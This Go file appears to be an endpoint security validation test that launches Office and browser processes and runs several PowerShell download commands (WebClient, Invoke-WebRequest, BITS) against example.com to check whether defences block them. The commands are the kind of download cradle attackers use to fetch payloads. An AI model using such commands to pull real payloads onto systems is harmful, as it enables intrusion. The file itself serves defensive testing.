//go:build windows
// +build windows

/*
ID: 7200673e-588c-45d5-be48-bc5c7a908d6b
NAME: Suspicious PowerShell Downloads
CREATED: 2024-06-29
scenario: powershell processes that attempted to download files
descendants of MS Office, doc viewers, web browsers, business software
*/
package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"

	Endpoint "github.com/preludeorg/test/endpoint"
)

func main() {
	Endpoint.Say("[+] Starting Suspicious PowerShell Downloads VST")
	Endpoint.Start(test, cleanup)
}

func test() {
	// Define the commands that simulate PowerShell downloads with different parent processes
	commands := []string{
		"powershell.exe -Command \"(New-Object Net.WebClient).DownloadString('http://example.com')\"",
		"powershell.exe -Command \"(New-Object Net.WebClient).DownloadFile('http://example.com', 'C:\\temp\\file.txt')\"",
		"powershell.exe -Command \"Invoke-WebRequest -Uri http://example.com -OutFile C:\\temp\\file.txt\"",
		"powershell.exe -Command \"Start-BitsTransfer -Source http://example.com -Destination C:\\temp\\file.txt\"",
	}

	parentProcesses := []string{
		"winword.exe",
		"excel.exe",
		"outlook.exe",
		"powerpnt.exe",
		"firefox.exe",
		"chrome.exe",
		"iexplore.exe",
		"safari.exe",
		"microsoftedge.exe",
	}

	for _, parent := range parentProcesses {
		for _, command := range commands {
			// Simulate the parent process
			parentCmd := exec.Command("cmd.exe", "/C", fmt.Sprintf("start /B %s", parent))
			err := parentCmd.Start()
			if err != nil {
				Endpoint.Say(fmt.Sprintf("[-] Failed to start parent process: %s", parent))
				Endpoint.Stop(1) // ERROR
			}

			// Check if we can execute the command (simulate a protection mechanism)
			if !Endpoint.IsAvailable("powershell.exe") {
				Endpoint.Say("[+] Command execution is not available")
				Endpoint.Stop(126) // PROTECTED: Access Denied
			}

			// Execute the PowerShell download command
			out, err := exec.Command("cmd.exe", "/C", command).CombinedOutput()
			if err != nil {
				Endpoint.Say(fmt.Sprintf("[-] Failed to execute command: %s", string(out)))
				Endpoint.Stop(1) // ERROR
			}

			Endpoint.Say(fmt.Sprintf("[+] Successfully executed command: %s with parent: %s", command, parent))

			// Check if the process was blocked (simulate a protection mechanism)
			if strings.Contains(string(out), "Access Denied") {
				Endpoint.Say("[+] Process execution was blocked")
				Endpoint.Stop(126) // PROTECTED: Access Denied
			}
		}
	}

	Endpoint.Say("[+] Successfully executed all commands")
	Endpoint.Stop(101) // UNPROTECTED
}

func cleanup() {
	// Clean up any created files or artifacts
	os.Remove("C:\\temp\\file.txt")
	Endpoint.Say("[+] Cleanup completed successfully")
	Endpoint.Stop(100) // PROTECTED
}